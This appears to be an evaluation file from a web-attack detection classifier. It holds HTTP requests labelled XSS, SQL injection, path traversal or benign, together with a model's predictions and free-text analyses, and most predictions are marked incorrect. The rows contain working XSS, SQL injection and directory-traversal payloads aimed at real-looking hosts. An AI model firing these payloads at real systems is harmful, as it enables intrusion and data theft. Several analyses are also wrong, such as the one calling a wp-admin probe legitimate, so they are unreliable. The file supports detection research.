Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
119063,"GET /board/board_write?code=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Carticle+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Farticle%3E HTTP/1.1
Host: 10.0.20.20
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
Accept-Language: en-US,en;q=0.5
DNT: 1
Upgrade-Insecure-Requests: 1",1,XSS,,10,-1,False,"Attack Payload

This payload is an attempt to inject a malicious animation into an HTML element, which will trigger an alert box when the animation is finished. The payload is injected through the `style` attribute of an `article` element.

Here's a breakdown of the payload:

1. `<style>... </style>`: This is an HTML style element that contains the malicious code.
2. `@keyframes x { }`: This is a CSS keyframe animation definition that will be used to trigger the alert box.
3. `<article style=""animation-name: x"" onanimationend=""alert(1)"">... </article>`: This is an HTML article element that has a style attribute set to `animation-name: x`, which will trigger the animation. The `onanimationend` event is set to `alert(1)`, which will execute the `alert` function when the animation is finished.

The payload is attempting to exploit a vulnerability in the server-side rendering of the HTML element, by injecting a malicious animation that will trigger the `alert` function when the animation is finished."
73574,GET / HTTP/1.1Host: 220.70.50.143Accept: */*Accept-Encoding: gzipUser-Agent: Mozilla/5.0 zgrab/0.x,1,,,11,-1,False,"Attack Payload!

This payload appears to be a reconnaissance payload, likely used for a vulnerability scan or a web crawler. The payload is requesting the root directory of the target server (""/"") and is using a lightweight user agent string that identifies the tool as ""zgrab"" (which is a popular web crawler and reconnaissance tool).

The payload is also using the ""Accept"" header to request all available content types, and the ""Accept-Encoding"" header to request compressed responses. The User-Agent header is set to a generic string that identifies the client as a Mozilla browser.

Overall, this payload suggests that the attacker is attempting to gather information about the target server, its configuration, and its vulnerabilities."
83192," /bms/common/download.do HTTP/1.1
Referer: http://onnara9.saas.gcloud.go.kr/bms/dct/viewreport.do
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
Accept-Encoding: gzip, deflate
Host: onnara9.saas.gcloud.go.kr
Content-Length: 597
Connection: Keep-Alive
Cookie: JSESSIONID=WQJhbDIlNF3JH7M3EJR3WJV7.onnara9-55-2vrg2; 7a1aedcab09ca8f8f89334fd91053f10=43240efed156c138311c30d9699e7e48; KHANUSER=z1t1jhe8jasekf; READDOCIDCOOKIE=DCTB70ABC5C220E61BA5A6DA5CD4C5BE9DC

",0,Not Attack,,12,-1,False,"I have analyzed the payload you provided.

This appears to be a HTTP request to a Korean website (onnara9.saas.gcloud.go.kr) to download a file. The request includes a number of headers, including the User-Agent header, which is set to a generic Chrome 70 browser string. The request also includes a Cookie header with several cookies, including a JSESSIONID, a custom cookie, and a READDOCIDCOOKIE.

The request body contains a form-encoded payload, which is likely used to authenticate the request and specify the file to be downloaded.

As this is a HTTP request, I would classify this as a non-attack payload.

If you have any further questions or concerns, please let me know!"
113408,"n>
                <option value=""https://privacy.kisa.or.kr/main.do""></option>
                <option value=""https://intra.privacy.go.kr/uat/uia/egovLoginUsr.do""></option>
                <option value=""https://link.privacy.go.kr/nadac/index.do""></option>
                <option value=""https://kidc.eprivacy.go.kr""></option>
....<option value=""http://www.boho.or.kr/main.do"">()</option>
                <option value=""http://www.spamcop.or.kr""></option>
                <option value=""http://www.rootca.or.kr""></option>
                <option value=""https://ecrm.police.go.kr""> (ECRM)</option>
                <option value=""https://www.ncsc.go.kr:4018""> </option>
                <option value=""http://www.ecmc.or.kr"">ICT</option>
            </select>
            <a href=""javascript:void(0)""></a>
        </div>

        <ul class=""oneFooterLayout_logoList"">
            <li><a href=""/""><img src=""/assets/img/common/logo_privacy.svg"" alt=""""></a></li>
<!--             <li><a href=""javascript:void(0)""><img src=""/assets/img/common/webAccessibility.svg"" alt=""().",0,Not Attack,,13,-1,False,"This payload appears to be a web page snippet with a dropdown menu containing various links to privacy-related websites and organizations in South Korea. The payload does not contain any malicious code or suspicious activity, and it seems to be a legitimate use of HTML and JavaScript to render the dropdown menu.

The payload can be classified as a ""non-attack"" or ""benign"" payload."
122527,"GET /board/?category=%3C%2Fscript%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cscript%3E&gdviewer=1&goods_seq=52&id=goods_review&iframe=1&page=&perpage=&popup=&score=&search_text=ZAP HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/board/?gdviewer=1&goods_seq=52&id=goods_review&iframe=1
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,-1,False,
63444,GET  / wp - admin / js / widgets / license . php HTTP /  1  .  1   Host :  kiost . ac  user - agent :  Mozilla /  5  .  0   ( Windows NT  1  0  .  0  ;  Win 6  4  ;  x 6  4  )  AppleWebKit /  5  3  7  .  3  6   ( KHTML  COMMA   like Gecko )  Chrome /  8  5  .  0  .  4  1  8  3  .  1  0  2  Safari /  5  3  7  .  3  6   Accept - Encoding :  gzip  COMMA   deflate  Accept :   *  /  *   Connection :  keep - alive  Cookie :  JSESSIONID =  6 CA 7 DD 8  0 AF 3  9  3 FCA 7 ACE 8  9  0  1 E 8 AF 0  9  7 C,1,,,15,-1,False,"I have analyzed the payload, and it appears to be a GET request to a WordPress administrative page (/wp-admin/js/widgets/license.php). The request is made from a client with a user agent string indicating a Windows 10 system with Google Chrome 85.0.41.83.

Here are the details:

* Request method: GET
* Request URL: /wp-admin/js/widgets/license.php
* Host: kiost.ac
* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.41.83 Safari/537.36
* Accept-Encoding: gzip, deflate
* Accept: */*
* Connection: keep-alive
* Cookie: JSESSIONID=6CA7DD8093FCA7ACE89019C

This request appears to be a legitimate administrative request for a WordPress website, and it does not appear to be malicious."
20566,"/dvwa/instructions.php?doc=PDF%27%3B%27%20AND%208921%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288921%3D8921%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27TWUo%27%3D%27TWUo sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=ma5430vuuvr6ltjm8okkrh5p49,",1,SI,,16,-1,False,Attack!
2582,"GET /servlets/org/front/board/action/board?,nd=-4305%22%29%20OR%208592%3D7336--%20SQtK&listcount=10&curpage=1&orderby=&direction=&board=notice&board_seq=8669&b_cate=&b_search= HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/312.5.2 (KHTML, like Gecko) Safari/312.3.3\r\nReferer: http://koreatta.sports.or.kr:80/servlets/org/front/board/action/board\r\nHost: koreatta.sports.or.kr\r\nCookie: JSESSIONID=687E670FA15545C67CAC389EA80390E0\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,17,1,True,1
10053,"GET /sparql?output=json&format=json&timeout=0&query=SELECT%20DISTINCT%20*%20WHERE%20%7B%3Fobject%20%3Fproperty%20%3Chttp%3A%2F%2Fdata.visitkorea.or.kr%2Fresource%2F130557%3E.%20FILTER(isIRI(%3Fobject))%7D%20LIMIT%20100&callback=lodlive HTTP/1.1\r\nHost: data.visitkorea.or.kr\r\nAccept-Language: en-US\r\nCookie: JSESSIONID=25933F53EA58413271EB1F7C39B21D37.router\r\nReferer: http://data.visitkorea.or.kr/lodlive?http://data.visitkorea.or.kr/resource/130557\r\nConnection: keep-alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\nAccept-Encoding: gzip,deflate,br",0,Not Attack,,18,-1,False,"This payload appears to be a SPARQL query that retrieves data from a triplestore database. The query is using the `SELECT` statement to retrieve distinct values from the `*` wildcard, where the subject is an IRI (Internationalized Resource Identifier) and the predicate is a specific property. The `FILTER` clause is used to filter out non-IRI values.

The `LIMIT` clause is used to limit the results to 100.

The `callback` parameter is set to `lodlive`, which suggests that the query is being executed as part of a LOD (Linked Open Data) application.

The payload does not appear to be malicious, but it could potentially be used to extract sensitive data from the triplestore database if not properly secured."
21528,"GET /imageProxy.do?svc=2D&param=/geoserver/seoul/wfs?service=WFS&version=1.0.0&request=GetFeature&outputFormat=application%2Fjson&typeName=seoul:poi_base&CQL_FILTER=level%3C=10%20and%20bbox(geom,195260,553752,195324,553816) HTTP/1.1\r\nHost: smap.seoul.go.kr\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\r\nAccept: */*\r\nReferer: http://smap.seoul.go.kr/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: _ga=GA1.3.1388692350.1599706919; WL_PCID=15997069189891159054347; _gid=GA1.3.1267222758.1617707223; isVisited=true; JSESSIONID=E72C09BC53BB265E80D81400AE4CF677",0,Not Attack,,19,-1,False,"Not a payload, but a legitimate request to a geospatial server."
45042,"GET /media/mediaList.do?code_id=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini&itmViewer=&mdatp_cd=&mode= HTTP/1.1\r\nReferer: http://archive.acc.go.kr/\r\nCookie: JSESSIONID=hyx0Js8BbEoMzhRawtXT1rjTjZH5cBV0XwzIoqrnKi5RdUvUJqbXQLt3QWMmX1Oy.amV1c19kb21haW4vYXJjaGl2ZV9zZXJ2ZXI=\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\r\nX-Akamai-CONFIG-LOG-DETAIL: true\r\nTE:  chunked;q=1.0\r\nConnection: TE\r\nAccept-Encoding: gzip\r\nAkamai-Origin-Hop: 1\r\nVia: 1.1 akamai.net(ghost) (AkamaiGHost)\r\nX-Forwarded-For: 155.159.255.233\r\nTrue-Client-IP: 155.159.255.233\r\nHost: archive.acc.go.kr\r\nPragma: no-cache\r\nCache-Control: no-cache, max-age=0\r\nConnection: keep-alive",1,PT,,20,-1,False,"**ATTENTION!**

This payload is attempting to perform a directory traversal attack on the server. It's likely that the server is vulnerable to this type of attack, which could potentially allow an attacker to access sensitive files and data.

The payload is attempting to access a file named ""windows\win.ini"" by concatenating multiple directory traversal characters (`..`) to the end of the `code_id` parameter. This could potentially allow an attacker to access files outside of the intended directory.

I strongly advise you to report this vulnerability to the server administrators and to take immediate action to secure your system against this type of attack."
